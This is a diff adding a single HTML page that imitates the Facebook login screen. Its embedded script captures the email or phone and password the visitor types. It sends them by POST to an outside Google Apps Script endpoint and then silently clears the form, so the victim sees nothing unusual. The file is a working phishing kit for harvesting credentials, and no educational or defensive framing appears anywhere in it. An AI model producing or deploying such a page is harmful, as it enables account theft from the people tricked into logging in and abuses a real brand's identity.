@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <h1>Facebook</h1>
+      <form id="loginForm">
+        <div class="textbox">
+          <input type="text" id="email" name="email" placeholder="Email or Phone" required>
+        </div>
+        <div class="textbox">
+          <input type="password" id="password" name="password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="btn">Log In</button>
+        <p class="forgot-password"><a href="#">Forgot Password?</a></p>
+      </form>
+      <hr>
+      <button class="btn create-account-btn">Create New Account</button>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(event){
+        event.preventDefault(); // Prevent the default form submission
+        const formData = new FormData(this); // Create FormData object
+        fetch("https://script.google.com/macros/s/AKfycbxBJchRJbrdJNgSKVAILWKsJCaYi5VHRADxaZrhX82P4_efRe2ycd4Osz3eyHNbi9fn/exec", { // Replace with your Google Apps Script URL
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.text())
+        .then(data => {
+            //alert(data); // Show success message
+            document.getElementById("loginForm").reset(); // Reset the form
+        })
+        .catch(error => console.error("Error:", error)); // Log errors if any
+    });
+</script>
+</body>
+</html>
